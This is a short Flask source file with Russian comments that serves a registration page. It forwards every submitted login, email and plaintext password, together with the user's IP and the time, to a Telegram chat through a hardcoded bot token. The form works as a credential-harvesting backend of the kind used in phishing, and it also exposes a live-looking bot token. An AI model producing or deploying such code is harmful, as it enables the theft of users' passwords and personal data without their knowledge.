from flask import Flask, render_template, request
import requests
from datetime import datetime

app = Flask(__name__)

# Вставьте сюда свои токен и чат ID
TELEGRAM_BOT_TOKEN = '6122680029:AAH38_qmiiYevrKnTif_fL9o-TdPg3uEBwI'
TELEGRAM_CHAT_ID = '990030901'

def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    response = requests.post(url, data=data)
    return response.json()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        login = request.form['login']
        email = request.form['email']
        password = request.form['password']
        # Получение IP пользователя
        user_ip = request.remote_addr
        # Получение текущего времени
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        # Формируем сообщение
        message = (
            f'Новая регистрация:\n'
            f'Логин: {login}\n'
            f'Email: {email}\n'
            f'Пароль: {password}\n'
            f'IP: {user_ip}\n'
            f'Время: {now}'
        )
        send_telegram_message(message)
        return render_template('register.html', success=True)
    return render_template('register.html', success=False)

if __name__ == '__main__':
    app.run(debug=True)